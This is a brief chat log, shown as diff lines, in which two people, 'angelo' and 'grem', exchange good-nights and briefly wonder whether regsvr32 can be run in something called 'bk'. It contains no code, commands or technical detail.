+[26.11.21 21:51:43] angelo: got it
+[26.11.21 21:51:51] angelo: kinda got it
+[26.11.21 21:52:16] grem: about regsvr32 recently collin asked, I don't know if bk can run it
+[26.11.21 21:52:45] angelo: check it out
+[26.11.21 21:52:50] angelo: not now
+[26.11.21 21:52:56] angelo: yes and he is needed
+[26.11.21 21:52:59] angelo: anything else ?
+[26.11.21 21:53:10] grem: all bye
+[26.11.21 21:53:19] angelo: thanks !
+[26.11.21 21:53:22] angelo: good night !
+[26.11.21 21 21:53:29] angelo: See you Monday!
+[26.11.21 21:53:37] grem: good night
+[26.11.21 21:53:50] angelo: bye !
+[26.11.21:55:18] grem: > about regsvr32 recently collin asked, I don't know if it is possible to run in bk
+more exactly it probably is possible, but i don't know how exactly it is run
+[26.11.21 21:55:28] angelo: we'll find out.)
+[29.12.21 13:14:11] angelo: ))))))))))
